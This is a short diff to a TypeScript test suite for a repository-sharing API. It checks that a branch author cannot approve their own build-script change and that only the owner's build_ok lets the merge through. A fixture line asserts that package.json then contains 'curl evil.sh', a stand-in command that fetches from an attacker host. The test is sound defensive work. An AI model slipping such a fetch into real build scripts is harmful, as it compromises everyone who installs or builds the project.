@@ -1662,6 +1662,8 @@ describe("shares", () => {
     const no = await post(call, "ana", "/api/repos/ana/r/branches/sneaky/merge", {});
     expect(no.status).toBe(409);
     expect((await no.json() as any).build).toEqual(["package.json"]);
+    // The author's own build_ok is no read: only the owner's, or another member's, counts.
+    expect((await post(call, "agent-a", "/api/repos/ana/r/branches/sneaky/merge", { build_ok: true })).status).toBe(409);
     expect(text(await (await call("ana", "/api/repos/ana/r/do/file?path=package.json")).json() as Doc)).toContain("vite build");
     expect((await post(call, "ana", "/api/repos/ana/r/branches/sneaky/merge", { build_ok: true })).status).toBe(200);
     expect(text(await (await call("ana", "/api/repos/ana/r/do/file?path=package.json")).json() as Doc)).toContain("curl evil.sh");
